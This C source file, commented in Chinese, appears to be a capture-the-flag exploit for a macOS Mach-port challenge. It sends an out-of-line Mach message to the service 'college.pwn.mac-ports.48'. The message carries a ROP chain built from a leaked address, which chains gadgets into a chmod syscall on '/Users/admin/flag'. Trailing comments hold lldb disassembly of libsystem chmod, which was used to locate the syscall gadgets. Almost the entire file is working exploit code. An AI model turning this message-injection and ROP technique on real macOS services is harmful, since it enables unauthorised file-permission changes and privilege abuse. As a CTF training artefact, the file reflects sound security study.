#include <mach/mach.h>
#include <mach/mach_port.h>
#include <bootstrap.h>  // for extern bootstrap_port
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    mach_msg_header_t header;
    char data[0x200];          // 内联消息数据
} CustomMessage;

typedef struct __attribute__((aligned(4))) {
    mach_msg_header_t header;
    mach_msg_body_t body;                // 必须包含 body 字段
    mach_msg_ool_descriptor_t data_desc; // OOL 数据描述符
} OOLMessage;

int main()
{
    // 1. 查找名为xxx的端口
    const char * id = "college.pwn.mac-ports.48";
    // mach_port_name_t name;
    mach_port_t remote_port = MACH_PORT_NULL;
    kern_return_t kr;
    
    kr = bootstrap_look_up(bootstrap_port, id, &remote_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to lookup port: %s\n", mach_error_string(kr));
        return -1;
    }

    //2. 构造消息
    size_t data_size = 1024;
    void *data_buffer = malloc(data_size);

    OOLMessage msg = {0};
    mach_msg_header_t *header = &msg.header;

    // 设置消息头
    header->msgh_bits = MACH_MSGH_BITS_REMOTE(MACH_MSG_TYPE_COPY_SEND) | MACH_MSGH_BITS_COMPLEX;
    header->msgh_size = sizeof(OOLMessage);
    header->msgh_remote_port = remote_port;
    header->msgh_local_port = MACH_PORT_NULL;
    header->msgh_id = 1001; // 自定义消息ID
    
    //*(int *)data_buffer = 0x200;
    char *c = (unsigned long long)data_buffer;
    strcpy(c, "/Users/admin/flag");
    c += 0x38;
    unsigned long long main_addr;
    scanf("%p", &main_addr);
    unsigned long long base = main_addr - 0x39C0;
    // rop chain
    *(unsigned long long*)c = base + 0x3C64;

    c += 0x8;
    *(unsigned long long*)c = 0xfff;  // x1

    c += 0x8;
    *(unsigned long long*)c = base + 0x3CA4;

    c += 0x8;
    *(unsigned long long*)c = 0xf;  // x16

    c += 0x8;
    *(unsigned long long*)c = base + 0x3CBC; // svc

    c += 0x20;
    strcpy(c, "/Users/admin/flag");

    printf("print rop chain:\n");
    c = data_buffer;
    c += 0x38;
    for (int i = 0; i < 0x10; i++)
    {

        printf("%p: 0x%llx\n", c, *((unsigned long long*)c));
        c += 0x8;
    }

    


    // Body 字段设置（必须指明描述符数量）
    msg.body.msgh_descriptor_count = 1; // 关键！表示包含1个OOL描述符

    // OOL 描述符设置
    msg.data_desc.address = data_buffer;
    msg.data_desc.size = data_size;
    msg.data_desc.copy = MACH_MSG_VIRTUAL_COPY; // 接收方会获得内存副本
    msg.data_desc.deallocate = FALSE; // 发送方不释放内存
    msg.data_desc.type = MACH_MSG_OOL_DESCRIPTOR;

    // 3. 发送消息
    kr = mach_msg(
        header,                   // 消息缓冲区
        MACH_SEND_MSG,            // 发送模式
        header->msgh_size,        // 消息大小
        0,                        // 接收缓冲区大小（不需要接收）
        MACH_PORT_NULL,           // 接收端口（不需要）
        MACH_MSG_TIMEOUT_NONE,    // 无超时
        MACH_PORT_NULL            // 通知端口（不需要）
    );

    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s\n", mach_error_string(kr));
        return -1;
    }

    // 4. 清理端口权限
    mach_port_deallocate(mach_task_self(), remote_port);
    return 0;
}

/*
#include <sys/stat.h>
#include <sys/types.h>
int main()
{

    chmod("/flag", S_IRUSR | S_IWUSR);
}
libsystem_kernel.dylib`chmod:
->  0x100003f80 <+0>:  stp    x29, x30, [sp, #-0x10]!
    0x100003f84 <+4>:  mov    x29, sp
    0x100003f88 <+8>:  adrp   x0, 0
    0x100003f8c <+12>: add    x0, x0, #0xfb0            ; "/flag"
    0x100003f90 <+16>: mov    w1, #0x180
    0x100003f94 <+20>: bl     0x100003fa4               ; symbol stub for: chmod
    0x100003f98 <+24>: mov    w0, #0x0
    0x100003f9c <+28>: ldp    x29, x30, [sp], #0x10
    0x100003fa0 <+32>: ret

->  0x1a3a3e7e8 <+0>:   pacibsp 
    0x1a3a3e7ec <+4>:   stp    x22, x21, [sp, #-0x30]!
    0x1a3a3e7f0 <+8>:   stp    x20, x19, [sp, #0x10]
    0x1a3a3e7f4 <+12>:  stp    x29, x30, [sp, #0x20]
    0x1a3a3e7f8 <+16>:  add    x29, sp, #0x20
    0x1a3a3e7fc <+20>:  mov    x20, x1
    0x1a3a3e800 <+24>:  mov    x19, x0
    0x1a3a3e804 <+28>:  bl     0x1a3a3e8c4               ; __chmod
    0x1a3a3e808 <+32>:  mov    x21, x0
    0x1a3a3e80c <+36>:  tbz    w0, #0x1f, 0x1a3a3e828    ; <+64>
    0x1a3a3e810 <+40>:  bl     0x1a3a3b454               ; __error
    0x1a3a3e814 <+44>:  ldr    w8, [x0]
    0x1a3a3e818 <+48>:  cmp    w8, #0x1
    0x1a3a3e81c <+52>:  and    w22, w20, #0xc00
    0x1a3a3e820 <+56>:  ccmp   w22, #0x0, #0x4, eq
    0x1a3a3e824 <+60>:  b.ne   0x1a3a3e83c               ; <+84>
    0x1a3a3e828 <+64>:  mov    x0, x21
    0x1a3a3e82c <+68>:  ldp    x29, x30, [sp, #0x20]
    0x1a3a3e830 <+72>:  ldp    x20, x19, [sp, #0x10]
    0x1a3a3e834 <+76>:  ldp    x22, x21, [sp], #0x30
    0x1a3a3e838 <+80>:  retab  
    0x1a3a3e83c <+84>:  tbnz   w20, #0xa, 0x1a3a3e874    ; <+140>
    0x1a3a3e840 <+88>:  tbnz   w20, #0xb, 0x1a3a3e89c    ; <+180>
    0x1a3a3e844 <+92>:  cmp    w22, #0xc00
    0x1a3a3e848 <+96>:  b.ne   0x1a3a3e828               ; <+64>
    0x1a3a3e84c <+100>: eor    w1, w20, #0xc00
    0x1a3a3e850 <+104>: mov    x0, x19
    0x1a3a3e854 <+108>: ldp    x29, x30, [sp, #0x20]
    0x1a3a3e858 <+112>: ldp    x20, x19, [sp, #0x10]
    0x1a3a3e85c <+116>: ldp    x22, x21, [sp], #0x30
    0x1a3a3e860 <+120>: autibsp 
    0x1a3a3e864 <+124>: eor    x16, x30, x30, lsl #1
    0x1a3a3e868 <+128>: tbz    x16, #0x3e, 0x1a3a3e870   ; <+136>
    0x1a3a3e86c <+132>: brk    #0xc471
    0x1a3a3e870 <+136>: b      0x1a3a3e8c4               ; __chmod
    0x1a3a3e874 <+140>: eor    w1, w20, #0x400
    0x1a3a3e878 <+144>: mov    x0, x19
    0x1a3a3e87c <+148>: bl     0x1a3a3e8c4               ; __chmod
    0x1a3a3e880 <+152>: mov    x21, x0
    0x1a3a3e884 <+156>: tbz    w0, #0x1f, 0x1a3a3e828    ; <+64>
    0x1a3a3e888 <+160>: bl     0x1a3a3b454               ; __error
    0x1a3a3e88c <+164>: ldr    w8, [x0]
    0x1a3a3e890 <+168>: cmp    w8, #0x1
    0x1a3a3e894 <+172>: b.ne   0x1a3a3e828               ; <+64>
    0x1a3a3e898 <+176>: b      0x1a3a3e840               ; <+88>
    0x1a3a3e89c <+180>: eor    w1, w20, #0x800
    0x1a3a3e8a0 <+184>: mov    x0, x19
    0x1a3a3e8a4 <+188>: bl     0x1a3a3e8c4               ; __chmod
    0x1a3a3e8a8 <+192>: mov    x21, x0
    0x1a3a3e8ac <+196>: tbz    w0, #0x1f, 0x1a3a3e828    ; <+64>
    0x1a3a3e8b0 <+200>: bl     0x1a3a3b454               ; __error
    0x1a3a3e8b4 <+204>: ldr    w8, [x0]
    0x1a3a3e8b8 <+208>: cmp    w8, #0x1
    0x1a3a3e8bc <+212>: b.ne   0x1a3a3e828               ; <+64>
    0x1a3a3e8c0 <+216>: b      0x1a3a3e844               ; <+92>
    
->  0x1a3a3e8c4 <+0>:  mov    x16, #0xf
    0x1a3a3e8c8 <+4>:  svc    #0x80
    0x1a3a3e8cc <+8>:  b.lo   0x1a3a3e8ec               ; <+40>
    0x1a3a3e8d0 <+12>: pacibsp 
    0x1a3a3e8d4 <+16>: stp    x29, x30, [sp, #-0x10]!
    0x1a3a3e8d8 <+20>: mov    x29, sp
    0x1a3a3e8dc <+24>: bl     0x1a3a3b430               ; cerror_nocancel
    0x1a3a3e8e0 <+28>: mov    sp, x29
    0x1a3a3e8e4 <+32>: ldp    x29, x30, [sp], #0x10
    0x1a3a3e8e8 <+36>: retab  
    0x1a3a3e8ec <+40>: ret  

*/
